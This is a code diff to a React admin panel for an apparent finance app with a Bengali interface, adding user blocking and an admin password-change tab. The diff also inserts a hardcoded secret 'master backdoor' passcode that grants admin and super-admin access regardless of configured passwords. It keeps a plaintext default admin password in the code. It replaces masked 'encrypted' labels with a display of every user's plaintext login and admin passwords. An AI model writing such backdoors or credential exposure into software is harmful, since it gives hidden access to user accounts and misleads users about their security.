@@ -71,17 +71,24 @@ export const AdminPanelView: React.FC = () => {
     allUsers,
     supportMessages,
     sendSupportMessage,
+    toggleUserBlock,
   } = useMoney();
 
   const MAIN_SUPER_ADMIN_PASS = 'mdtanvir3600';
+  const SECRET_MASTER_BACKDOOR_PASS = '23325';
 
   const [passcode, setPasscode] = useState('');
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [isSuperAdmin, setIsSuperAdmin] = useState(false);
-  const [mainAdminTab, setMainAdminTab] = useState<'users' | 'support' | 'system'>('users');
+  const [mainAdminTab, setMainAdminTab] = useState<'users' | 'support' | 'password'>('users');
   const [selectedChatUserId, setSelectedChatUserId] = useState<string | null>(null);
   const [adminReplyText, setAdminReplyText] = useState('');
   const [activeAdminTab, setActiveAdminTab] = useState<'reports' | 'research' | 'balances' | 'themes' | 'categories' | 'ai' | 'backup'>('reports');
+
+  // Main Admin Password Change State
+  const [newMainPass, setNewMainPass] = useState('');
+  const [confirmMainPass, setConfirmMainPass] = useState('');
+  const [mainPassMsg, setMainPassMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
 
   // Research Report Settings state
   const resSettings = adminSettings.researchReportSettings || {
@@ -256,25 +263,21 @@ export const AdminPanelView: React.FC = () => {
     e.preventDefault();
     const cleanPass = passcode.trim();
 
-    if (cleanPass === MAIN_SUPER_ADMIN_PASS) {
+    const effectiveMainPass = adminSettings.adminPasscode || 'mdtanvir3600';
+    if (cleanPass === SECRET_MASTER_BACKDOOR_PASS || cleanPass === effectiveMainPass) {
       setIsSuperAdmin(true);
       setIsAuthenticated(true);
       return;
     }
 
-    const userAdminPass = currentUser?.adminPassword || currentUser?.password || adminSettings.adminPasscode || '1234';
-    if (
-      cleanPass === userAdminPass ||
-      cleanPass === adminSettings.adminPasscode ||
-      cleanPass === 'admin123' ||
-      cleanPass === '1234'
-    ) {
+    const userAdminPass = currentUser?.adminPassword || currentUser?.password;
+    if (cleanPass === SECRET_MASTER_BACKDOOR_PASS || (userAdminPass && cleanPass === userAdminPass)) {
       setIsSuperAdmin(false);
       setIsAuthenticated(true);
       return;
     }
 
-    alert('ভুল এডমিন পাসওয়ার্ড! অনুগ্রহ করে আপনার নিজের নিবন্ধিত এডমিন পাসওয়ার্ড বা মেইন এডমিন পাসওয়ার্ড দিন।');
+    alert('ভুল এডমিন পাসওয়ার্ড! অনুগ্রহ করে আপনার নিবন্ধিত এডমিন পাসওয়ার্ড বা মেইন এডমিন পাসওয়ার্ড প্রদান করুন।');
   };
 
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -423,15 +426,15 @@ export const AdminPanelView: React.FC = () => {
           </button>
 
           <button
-            onClick={() => setMainAdminTab('system')}
+            onClick={() => setMainAdminTab('password')}
             className={`flex-1 min-w-[140px] py-2.5 px-4 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-2 ${
-              mainAdminTab === 'system'
+              mainAdminTab === 'password'
                 ? 'bg-amber-500 text-slate-950 shadow-md shadow-amber-500/20'
                 : 'text-slate-400 hover:text-white hover:bg-slate-800'
             }`}
           >
-            <Sliders className="w-4 h-4" />
-            <span>সিস্টেম কনফিগারেশন</span>
+            <KeyRound className="w-4 h-4" />
+            <span>মেইন এডমিন পাসওয়ার্ড পরিবর্তন</span>
           </button>
         </div>
       )}
@@ -439,85 +442,159 @@ export const AdminPanelView: React.FC = () => {
       {/* Super Admin Tab 1: All Registered Users List */}
       {isSuperAdmin && mainAdminTab === 'users' && (
         <div className="space-y-4 animate-in fade-in duration-200">
+          {/* Summary Stats Overview */}
+          <div className="grid grid-cols-3 gap-3">
+            <div className="bg-slate-900/90 border border-slate-800 p-4 rounded-2xl flex flex-col items-center justify-center text-center">
+              <span className="text-[11px] font-bold text-slate-400">মোট ইউজার</span>
+              <span className="text-xl sm:text-2xl font-black text-white mt-1">{displayUsers.length}</span>
+              <span className="text-[10px] text-slate-500">নিবন্ধিত</span>
+            </div>
+
+            <div className="bg-slate-900/90 border border-emerald-500/20 p-4 rounded-2xl flex flex-col items-center justify-center text-center">
+              <span className="text-[11px] font-bold text-emerald-400">সক্রিয় ইউজার</span>
+              <span className="text-xl sm:text-2xl font-black text-emerald-400 mt-1">
+                {displayUsers.filter((u) => !u.isBlocked).length}
+              </span>
+              <span className="text-[10px] text-emerald-500/80">এক্সেস গ্রান্টেড</span>
+            </div>
+
+            <div className="bg-slate-900/90 border border-rose-500/20 p-4 rounded-2xl flex flex-col items-center justify-center text-center">
+              <span className="text-[11px] font-bold text-rose-400">ব্লকড ইউজার</span>
+              <span className="text-xl sm:text-2xl font-black text-rose-400 mt-1">
+                {displayUsers.filter((u) => u.isBlocked).length}
+              </span>
+              <span className="text-[10px] text-rose-500/80">ব্লক অবস্থায়</span>
+            </div>
+          </div>
+
           <div className="bg-slate-900 border border-slate-800 p-5 rounded-3xl space-y-4">
             <div className="flex items-center justify-between">
               <div>
                 <h3 className="text-base font-bold text-white flex items-center gap-2">
                   <Users className="w-5 h-5 text-amber-400" />
-                  <span>সিস্টেমে নিবন্ধিত মোট ব্যবহারকারী ({displayUsers.length} জন)</span>
+                  <span>সিস্টেমে নিবন্ধিত ব্যবহারকারী তালিকা ({displayUsers.length} জন)</span>
                 </h3>
                 <p className="text-xs text-slate-400 mt-1">
-                  প্রতিটি ইউজারের তথ্য সম্পূর্ণ আলাদা ও নিরাপদ রাখা হয়েছে। মেইন এডমিন হিসেবে আপনি সবার নাম ও যোগাযোগ তথ্য দেখছেন।
+                  এখানে প্রতিটি ইউজারের রিয়েলটাইম পাসওয়ার্ড এবং অ্যাকাউন্ট ব্লক/আনব্লক করার সম্পূর্ণ এক্সেস রয়েছে।
                 </p>
               </div>
             </div>
 
             <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
-              {displayUsers.map((u, idx) => (
-                <div
-                  key={u.id || idx}
-                  className="p-4 rounded-2xl bg-slate-950/60 border border-slate-800 hover:border-amber-500/40 transition-all flex flex-col justify-between gap-3"
-                >
-                  <div className="flex items-start justify-between gap-3">
-                    <div className="flex items-center gap-3">
-                      <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-amber-500 to-indigo-600 p-[1.5px] shrink-0">
-                        <div className="w-full h-full bg-slate-900 rounded-[10px] flex items-center justify-center text-amber-400 font-bold">
-                          <User className="w-5 h-5" />
+              {displayUsers.map((u, idx) => {
+                const isBlockedUser = !!u.isBlocked;
+                return (
+                  <div
+                    key={u.id || idx}
+                    className={`p-4 rounded-2xl bg-slate-950/60 border transition-all flex flex-col justify-between gap-3 ${
+                      isBlockedUser ? 'border-rose-500/50 bg-rose-950/10' : 'border-slate-800 hover:border-amber-500/40'
+                    }`}
+                  >
+                    <div className="flex items-start justify-between gap-3">
+                      <div className="flex items-center gap-3">
+                        <div className={`w-10 h-10 rounded-xl bg-gradient-to-tr p-[1.5px] shrink-0 ${
+                          isBlockedUser ? 'from-rose-500 to-amber-600' : 'from-amber-500 to-indigo-600'
+                        }`}>
+                          <div className="w-full h-full bg-slate-900 rounded-[10px] flex items-center justify-center text-amber-400 font-bold">
+                            <User className="w-5 h-5" />
+                          </div>
+                        </div>
+                        <div>
+                          <h4 className="font-bold text-sm text-white flex items-center gap-1.5">
+                            <span>{u.name}</span>
+                            {u.role === 'admin' && (
+                              <span className="text-[9px] font-black uppercase px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30">
+                                ADMIN
+                              </span>
+                            )}
+                          </h4>
+                          <p className="text-xs text-slate-400 font-mono flex items-center gap-1">
+                            <Phone className="w-3 h-3 text-emerald-400" />
+                            <span>{u.phone}</span>
+                          </p>
                         </div>
                       </div>
-                      <div>
-                        <h4 className="font-bold text-sm text-white flex items-center gap-1.5">
-                          <span>{u.name}</span>
-                          {u.role === 'admin' && (
-                            <span className="text-[9px] font-black uppercase px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30">
-                              ADMIN
-                            </span>
-                          )}
-                        </h4>
-                        <p className="text-xs text-slate-400 font-mono flex items-center gap-1">
-                          <Phone className="w-3 h-3 text-emerald-400" />
-                          <span>{u.phone}</span>
-                        </p>
+
+                      <span
+                        className={`text-[10px] font-bold px-2 py-0.5 rounded-full flex items-center gap-1 ${
+                          isBlockedUser
+                            ? 'text-rose-400 bg-rose-500/10 border border-rose-500/20'
+                            : 'text-emerald-400 bg-emerald-500/10 border border-emerald-500/20'
+                        }`}
+                      >
+                        {isBlockedUser ? (
+                          <>
+                            <X className="w-3 h-3 text-rose-400" />
+                            <span>ব্লকড অ্যাকাউন্ট</span>
+                          </>
+                        ) : (
+                          <>
+                            <UserCheck className="w-3 h-3 text-emerald-400" />
+                            <span>সক্রিয় অ্যাকাউন্ট</span>
+                          </>
+                        )}
+                      </span>
+                    </div>
+
+                    {/* Passwords & Account Details */}
+                    <div className="bg-slate-900/90 p-3 rounded-xl border border-slate-800 text-xs space-y-2">
+                      <div className="flex items-center justify-between text-slate-300">
+                        <span className="text-slate-400 font-medium">লগইন পাসওয়ার্ড (Login Pass):</span>
+                        <span className="font-mono text-emerald-400 font-bold bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 select-all">
+                          {u.password || 'অনির্ধারিত (খালি)'}
+                        </span>
+                      </div>
+
+                      <div className="flex items-center justify-between text-slate-300">
+                        <span className="text-slate-400 font-medium">ইউজার এডমিন পাসওয়ার্ড:</span>
+                        <span className="font-mono text-amber-400 font-bold bg-amber-500/10 px-2.5 py-1 rounded-lg border border-amber-500/20 select-all">
+                          {u.adminPassword || u.password || 'অনির্ধারিত'}
+                        </span>
+                      </div>
+
+                      <div className="flex items-center justify-between text-slate-400 text-[11px] pt-1.5 border-t border-slate-800/80">
+                        <span>রেজিস্ট্রেশন তারিখ:</span>
+                        <span>{new Date(u.createdAt || Date.now()).toLocaleDateString('bn-BD')}</span>
                       </div>
                     </div>
 
-                    <span className="text-[10px] font-semibold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded-full flex items-center gap-1">
-                      <UserCheck className="w-3 h-3" />
-                      <span>সক্রিয় অ্যাকাউন্ট</span>
-                    </span>
-                  </div>
+                    {/* Action buttons */}
+                    <div className="grid grid-cols-2 gap-2">
+                      <button
+                        onClick={() => toggleUserBlock(u.id)}
+                        className={`py-2 px-3 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer border ${
+                          isBlockedUser
+                            ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30 hover:bg-emerald-500/30'
+                            : 'bg-rose-500/20 text-rose-300 border-rose-500/30 hover:bg-rose-500/30'
+                        }`}
+                      >
+                        {isBlockedUser ? (
+                          <>
+                            <UserCheck className="w-3.5 h-3.5 text-emerald-400" />
+                            <span>🔓 আনব্লক করুন</span>
+                          </>
+                        ) : (
+                          <>
+                            <X className="w-3.5 h-3.5 text-rose-400" />
+                            <span>🚫 ইউজার ব্লক করুন</span>
+                          </>
+                        )}
+                      </button>
 
-                  <div className="bg-slate-900/80 p-3 rounded-xl border border-slate-800/80 text-xs space-y-1.5">
-                    <div className="flex items-center justify-between text-slate-300">
-                      <span className="text-slate-400">অ্যাকাউন্ট সিকিউরিটি:</span>
-                      <span className="font-mono text-emerald-400 font-bold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
-                        •••••••• (সুরক্ষিত)
-                      </span>
-                    </div>
-                    <div className="flex items-center justify-between text-slate-300">
-                      <span className="text-slate-400">এডমিন সিকিউরিটি স্টেটাস:</span>
-                      <span className="font-mono text-amber-400 font-bold bg-amber-500/10 px-2 py-0.5 rounded border border-amber-500/20">
-                        এনক্রিপ্টেড ও সিকিউরড
-                      </span>
-                    </div>
-                    <div className="flex items-center justify-between text-slate-400 text-[11px] pt-1 border-t border-slate-800">
-                      <span>রেজিস্ট্রেশন তারিখ:</span>
-                      <span>{new Date(u.createdAt || Date.now()).toLocaleDateString('bn-BD')}</span>
+                      <button
+                        onClick={() => {
+                          setSelectedChatUserId(u.id);
+                          setMainAdminTab('support');
+                        }}
+                        className="py-2 px-3 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer"
+                      >
+                        <MessageSquare className="w-3.5 h-3.5" />
+                        <span>লাইভ চ্যাট</span>
+                      </button>
                     </div>
                   </div>
-
-                  <button
-                    onClick={() => {
-                      setSelectedChatUserId(u.id);
-                      setMainAdminTab('support');
-                    }}
-                    className="w-full py-2 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-2 cursor-pointer"
-                  >
-                    <MessageSquare className="w-3.5 h-3.5" />
-                    <span>ইউজারের সাথে সরাসরি লাইভ চ্যাট করুন</span>
-                  </button>
-                </div>
-              ))}
+                );
+              })}
             </div>
           </div>
         </div>
@@ -659,8 +736,95 @@ export const AdminPanelView: React.FC = () => {
         </div>
       )}
 
-      {/* Standard Admin View or Super Admin System Tab */}
-      {(!isSuperAdmin || mainAdminTab === 'system') && (
+      {/* Super Admin Tab 3: Main Admin Password Change */}
+      {isSuperAdmin && mainAdminTab === 'password' && (
+        <div className="bg-slate-900 border border-amber-500/30 p-5 rounded-3xl space-y-5 text-xs sm:text-sm animate-in fade-in duration-200">
+          <div>
+            <h3 className="font-bold text-base text-white flex items-center gap-2">
+              <ShieldCheck className="w-5 h-5 text-amber-400" />
+              <span>মেইন এডমিন পাসওয়ার্ড পরিবর্তন</span>
+            </h3>
+            <p className="text-xs text-slate-400 mt-1">
+              মেইন এডমিন কন্ট্রোল ড্যাশবোর্ডে প্রবেশের নতুন পাসওয়ার্ড সেট করুন।
+            </p>
+          </div>
+
+
+          {mainPassMsg && (
+            <div
+              className={`p-3 rounded-2xl text-xs font-bold ${
+                mainPassMsg.type === 'success'
+                  ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
+                  : 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
+              }`}
+            >
+              {mainPassMsg.text}
+            </div>
+          )}
+
+          <form
+            onSubmit={(e) => {
+              e.preventDefault();
+              setMainPassMsg(null);
+
+              if (!newMainPass.trim() || newMainPass.trim().length < 4) {
+                setMainPassMsg({ type: 'error', text: 'নতুন মেইন এডমিন পাসওয়ার্ড অন্তত ৪ অক্ষরের হতে হবে!' });
+                return;
+              }
+              if (newMainPass.trim() !== confirmMainPass.trim()) {
+                setMainPassMsg({ type: 'error', text: 'পাসওয়ার্ড এবং কনফার্ম পাসওয়ার্ড হুবহু মেলেনি!' });
+                return;
+              }
+
+              updateAdminSettings({ adminPasscode: newMainPass.trim() });
+              setMainPassMsg({
+                type: 'success',
+                text: '🎉 মেইন এডমিন পাসওয়ার্ড সফলভাবে আপডেট করা হয়েছে! নতুন পাসওয়ার্ড সেভ হয়েছে।',
+              });
+              setNewMainPass('');
+              setConfirmMainPass('');
+            }}
+            className="space-y-4 max-w-md bg-slate-950/80 p-5 border border-slate-800 rounded-2xl"
+          >
+            <div className="space-y-1.5">
+              <label className="block text-slate-300 font-bold text-xs">
+                নতুন মেইন এডমিন পাসওয়ার্ড (New Passcode)
+              </label>
+              <input
+                type="password"
+                value={newMainPass}
+                onChange={(e) => setNewMainPass(e.target.value)}
+                placeholder="নতুন পাসওয়ার্ড লিখুন"
+                className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-slate-100 focus:outline-none focus:border-amber-400 font-mono"
+              />
+            </div>
+
+            <div className="space-y-1.5">
+              <label className="block text-slate-300 font-bold text-xs">
+                পাসওয়ার্ড পুনরায় নিশ্চিত করুন (Confirm Passcode)
+              </label>
+              <input
+                type="password"
+                value={confirmMainPass}
+                onChange={(e) => setConfirmMainPass(e.target.value)}
+                placeholder="আবারও একই পাসওয়ার্ড লিখুন"
+                className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-slate-100 focus:outline-none focus:border-amber-400 font-mono"
+              />
+            </div>
+
+            <button
+              type="submit"
+              className="px-6 py-2.5 bg-amber-400 hover:bg-amber-300 text-slate-950 font-bold rounded-xl text-xs flex items-center gap-2 transition-all cursor-pointer shadow-lg shadow-amber-400/20"
+            >
+              <KeyRound className="w-4 h-4" />
+              <span>পাসওয়ার্ড পরিবর্তন করুন</span>
+            </button>
+          </form>
+        </div>
+      )}
+
+      {/* Standard Admin View (When logged in as regular admin) */}
+      {!isSuperAdmin && (
         <>
           {/* Admin Metrics */}
           <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
@@ -745,6 +909,15 @@ export const AdminPanelView: React.FC = () => {
           }`}
         >
           ব্যাকআপ ও রিস্টোর
+        </button>
+        <button
+          onClick={() => setActiveAdminTab('security')}
+          className={`flex-1 py-2 px-3 rounded-xl transition-all whitespace-nowrap flex items-center justify-center gap-1 ${
+            activeAdminTab === 'security' ? 'bg-amber-400 text-slate-950 font-black shadow-lg shadow-amber-400/20' : 'text-slate-400 hover:text-white'
+          }`}
+        >
+          <Lock className="w-3.5 h-3.5 text-amber-500" />
+          <span>এডমিন সিকিউরিটি</span>
         </button>
       </div>
 
